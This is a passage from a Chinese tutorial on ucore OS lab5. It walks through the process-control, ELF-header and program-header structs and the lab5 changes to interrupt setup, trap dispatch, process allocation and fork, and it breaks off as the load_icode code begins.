当前进程的相关标志</span></span><br><span class="line">    <span class="keyword">char</span> name[PROC_NAME_LEN + <span class="number">1</span>];   <span class="comment">// 进程名称(可执行文件名)</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;         <span class="comment">// 进程链表 </span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;         <span class="comment">// 进程哈希表 </span></span><br><span class="line">    <span class="keyword">int</span> exit_code;    				 <span class="comment">/* lab5新增:描述线程退出时的原因 */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span> wait_state;			 <span class="comment">/* lab5新增:描述线程进入wait阻塞态的原因 */</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">cptr</span>, *<span class="title">yptr</span>, *<span class="title">optr</span>;</span>    <span class="comment">/* lab5新增:用于组织子进程链表 */</span> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     lab5新增:cptr(child ptr),指针指向当前进程的子进程中,最晚创建的那个子进程</span></span><br><span class="line"><span class="comment">     lab5新增:yptr(younger sibling ptr),指向与当前进程共享同一个父进程,但比当前进程的创建时间更晚的进程(younger)</span></span><br><span class="line"><span class="comment">     lab5新增:optr(older sibling ptr),指向与当前进程共享同一个父进程,但比当前进程的创建时间更早的进程(older)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>描述文件</strong></p>
<p>当文件加载到内存时，CPU必须要执行 load_icode 函数来把该文件加载到进程，因此，load_icode 函数必须要获取文件的相关信息</p>
<p>elfhdr 结构体（也被称为ELF文件头，或者文件头）专门用于描述文件的信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_magic;     <span class="comment">// 魔数(一定是魔数ELF_MAGIC-用于表示ELF文件)</span></span><br><span class="line">    <span class="keyword">uint8_t</span> e_elf[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">uint16_t</span> e_type;      <span class="comment">// 文件的类型(1=可重新定位,2=可执行,3=共享对象,4=核心镜像)</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_machine;   <span class="comment">// 处理器型号(3=x86, 4=68K,等等)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_version;   <span class="comment">// 文件版本(常常是&quot;1&quot;)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_entry;     <span class="comment">// 文件入口点(如果是可执行文件)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_phoff;     <span class="comment">// 程序头表(段头表结构体数组)的文件位置</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_shoff;     <span class="comment">// 节头的文件位置</span></span><br><span class="line">    <span class="keyword">uint32_t</span> e_flags;     <span class="comment">// 特定于架构的标志(通常为0)</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_ehsize;    <span class="comment">// 这个elf头的大小</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_phentsize; <span class="comment">// 程序头表中条目的大小</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_phnum;     <span class="comment">// 程序头表中的条目数</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_shentsize; <span class="comment">// 节头中条目的大小</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_shnum;     <span class="comment">// 节头中的条目数</span></span><br><span class="line">    <span class="keyword">uint16_t</span> e_shstrndx;  <span class="comment">// 包含节名字符串的节号</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>描述段</strong></p>
<p>ELF文件有多个段表，每个段表都有一个用于描述信息的段表头（program header），而各个段表头又组织在程序头表中</p>
<ul>
<li>proghdr：专门用来描述段信息的结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_type;   <span class="comment">// 段类型(可加载的代码或数据、动态链接信息)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_offset; <span class="comment">// 段的文件偏移量</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_va;     <span class="comment">// 映射段的虚拟地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_pa;     <span class="comment">// 物理地址(未使用)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_filesz; <span class="comment">// 文件中段的大小:告诉elf文件中该可调节段的实际/精确大小</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_memsz;  <span class="comment">// 内存中段的大小(如果包含bss,则更大):内存中段的总大小</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_flags;  <span class="comment">// 读read/写write/执行execute 位</span></span><br><span class="line">    <span class="keyword">uint32_t</span> p_align;  <span class="comment">// 所需的对齐方式(其值始终为硬件页面大小)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="练习0-把-lab4-的内容复制粘贴到-lab5"><a href="#练习0-把-lab4-的内容复制粘贴到-lab5" class="headerlink" title="练习0-把 lab4 的内容复制粘贴到 lab5"></a>练习0-把 lab4 的内容复制粘贴到 lab5</h2><p>不过相比 lab4，lab5 新添&amp;修改了一些内容：</p>
<ul>
<li><p>proc_struct：进程控制块结构体（上文已经提过）</p>
</li>
<li><p>idt_init：对中断描述符表进行初始化</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">lidt</span><span class="params">(struct pseudodesc *pd)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;lidt (%0)&quot;</span> :: <span class="string">&quot;r&quot;</span> (pd) : <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[]; <span class="comment">/* 声明:中断入口(每一项对应于中断描述符的中断服务例程的入口地址) */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(idt) / <span class="keyword">sizeof</span>(struct gatedesc); i ++) &#123;</span><br><span class="line">        <span class="comment">/* 遍历IDT数组(中断描述符表),将其中的内容(中断描述符)设置进IDT中断描述符表中(默认的DPL特权级(描述符特权级)都是内核态DPL_KERNEL-0) */</span></span><br><span class="line">        SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL); </span><br><span class="line">    &#125;</span><br><span class="line">    SETGATE(idt[T_SYSCALL], <span class="number">1</span>, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);</span><br><span class="line">    <span class="comment">/* lab5新增:为T_SYSCALL(系统调用的中断描述符)设置用户态权限(DPL_USER) */</span></span><br><span class="line">    lidt(&amp;idt_pd); <span class="comment">/* IDT */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>trap_dispatch：实现中断处理分发逻辑，也实现了对应的中断服务例程（用于处理T_SYSCALL系统调用中断）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_PGFLT                 14  <span class="comment">/* 页错误异常(page fault) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRQ_OFFSET              32  <span class="comment">// 中断请求偏移(Interrupt Request,IRQ)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRQ_TIMER               0   <span class="comment">// 中断请求-计时器中断</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRQ_KBD                 1	<span class="comment">// 中断请求-键盘中断</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRQ_COM1                4	<span class="comment">// 中断请求-串口中断</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRQ_IDE1                14  <span class="comment">// 中断请求-IDE通道1中断</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRQ_IDE2                15	<span class="comment">// 中断请求-IDE通道2中断</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRQ_ERROR               19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRQ_SPURIOUS            31</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_SYSCALL             0x80  <span class="comment">/* 系统调用(syscall) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_SWITCH_TOU                120    <span class="comment">/* 中断请求-内核到用户空间触发的中断 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_SWITCH_TOK                121    <span class="comment">/* 中断请求-用户空间到内核触发的中断 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">trap_dispatch</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 根据trapframe中断帧中的标志位,来执行具体的中断服务历程 */</span></span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (tf-&gt;tf_trapno) &#123;</span><br><span class="line">    <span class="keyword">case</span> T_PGFLT: <span class="comment">/* 页错误异常(page fault) */</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = pgfault_handler(tf)) != <span class="number">0</span>) &#123;</span><br><span class="line">            print_trapframe(tf);</span><br><span class="line">            <span class="comment">/* lab5新增:与进程相关的if判断语句 */</span></span><br><span class="line">            <span class="keyword">if</span> (current == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                panic(<span class="string">&quot;handle pgfault failed. ret=%d\n&quot;</span>, ret);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (trap_in_kernel(tf)) &#123;</span><br><span class="line">                    panic(<span class="string">&quot;handle pgfault failed in kernel mode. ret=%d\n&quot;</span>, ret);</span><br><span class="line">                &#125;</span><br><span class="line">                cprintf(<span class="string">&quot;killed by kernel.\n&quot;</span>);</span><br><span class="line">                panic(<span class="string">&quot;handle user mode pgfault failed. ret=%d\n&quot;</span>, ret); </span><br><span class="line">                do_exit(-E_KILLED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> T_SYSCALL: <span class="comment">/* 系统调用(syscall) */</span></span><br><span class="line">        syscall();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER: <span class="comment">/* 中断请求-计时器中断 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    LAB3 : <span class="function">If some page replacement <span class="title">algorithm</span><span class="params">(such as CLOCK PRA)</span> need tick to change the priority of pages, </span></span><br><span class="line"><span class="function">    then you can add code here. </span></span><br><span class="line"><span class="function"><span class="meta">#<span class="meta-keyword">endif</span></span></span></span><br><span class="line"><span class="function">        ticks ++</span>; <span class="comment">/* lab5新增:用于记录&quot;中断请求-计时器中断&quot;执行的次数 */</span></span><br><span class="line">        <span class="keyword">if</span> (ticks % TICK_NUM == <span class="number">0</span>) &#123; <span class="comment">/* 当前进程的时间片已用完,需要重新调度 */</span></span><br><span class="line">            assert(current != <span class="literal">NULL</span>);</span><br><span class="line">            current-&gt;need_resched = <span class="number">1</span>; <span class="comment">/* 设置需要重新调度 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_COM1: <span class="comment">/* 中断请求-串口中断 */</span></span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;serial [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_KBD: <span class="comment">/* 中断请求-键盘中断 */</span></span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;kbd [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOU: <span class="comment">/* 中断请求-内核到用户空间触发的中断 */</span></span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOK: <span class="comment">/* 中断请求-用户空间到内核触发的中断 */</span></span><br><span class="line">        panic(<span class="string">&quot;T_SWITCH_** ??\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE1: <span class="comment">/* 中断请求-IDE通道1中断 */</span></span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE2: <span class="comment">/* 中断请求-IDE通道2中断 */</span></span><br><span class="line">            <span class="comment">/* 本实验不涉及这一部分 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">/* lab5改动:完善了报错处理 */</span></span><br><span class="line">        print_trapframe(tf); <span class="comment">/* 打印trapframe结构体(中断帧,用于存储执行中断的信息) */</span></span><br><span class="line">        <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;unhandled trap.\n&quot;</span>);</span><br><span class="line">            do_exit(-E_KILLED);</span><br><span class="line">        &#125;</span><br><span class="line">        panic(<span class="string">&quot;unexpected trap in kernel.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>alloc_proc：分配一个 proc_struct，用于描述进程的信息</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct)); <span class="comment">/* 进行分配 */</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123; <span class="comment">/* 对相关proc_struct结构体条目进行初始化 */</span></span><br><span class="line">        proc-&gt;state = PROC_UNINIT;</span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;</span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">        proc-&gt;wait_state = <span class="number">0</span>; <span class="comment">/* lab5新增:设置进程为等待态 */</span></span><br><span class="line">        proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = <span class="literal">NULL</span>; <span class="comment">/* lab5新增:进程的兄弟父母节点为空 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>do_fork：创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同，在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>) &#123; <span class="comment">/* 分配一个物理页,作为proc_struct */</span></span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    proc-&gt;parent = current; <span class="comment">/* 设置父进程为当前进程 */</span></span><br><span class="line">    assert(current-&gt;wait_state == <span class="number">0</span>); <span class="comment">/* lab5新增:断言进程为等待态 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123; <span class="comment">/* 分配内核栈 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123; <span class="comment">/* 将所有虚拟页数据复制过去 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf); <span class="comment">/* 复制线程的状态,包括寄存器上下文等等 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid(); <span class="comment">/* 为进程分配唯一的PID */</span></span><br><span class="line">        hash_proc(proc); <span class="comment">/* 将proc添加到进程哈希链表中 */</span></span><br><span class="line">        set_links(proc); <span class="comment">/* lab5改动:取消list_add,采用set_links */</span></span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">    wakeup_proc(proc); <span class="comment">/* 设置新的子进程可执行(唤醒该进程) */</span></span><br><span class="line">    ret = proc-&gt;pid; <span class="comment">/* 设置返回值为pid */</span></span><br><span class="line">    </span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="comment">/* lab5新增:set_links就是在list_add的基础上,对部分proc_struct条目进行了初始化 */</span></span><br><span class="line">set_links(struct proc_struct *proc) &#123;</span><br><span class="line">    list_add(&amp;proc_list, &amp;(proc-&gt;list_link)); <span class="comment">/* 照常插链 */</span></span><br><span class="line">    proc-&gt;yptr = <span class="literal">NULL</span>; <span class="comment">/* 后续对进程结构体proc_struct进行设置 */</span></span><br><span class="line">    <span class="keyword">if</span> ((proc-&gt;optr = proc-&gt;parent-&gt;cptr) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc-&gt;optr-&gt;yptr = proc; <span class="comment">/* 链入子进程链表 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;parent-&gt;cptr = proc;</span><br><span class="line">    nr_process ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习1-加载应用程序并执行"><a href="#练习1-加载应用程序并执行" class="headerlink" title="练习1-加载应用程序并执行"></a>练习1-加载应用程序并执行</h2><p>do_execv 函数调用 load_icode 来加载并解析一个处于内存中的ELF执行文件格式的应用程序</p>
<p>load_icode 函数主要用来将执行程序加载到进程空间（执行程序本身已从磁盘读取到内存中），这涉及到修改页表、分配用户栈等工作</p>
<p>load_icode 已知代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_PT_LOAD                     1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">load_icode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> size)</span> 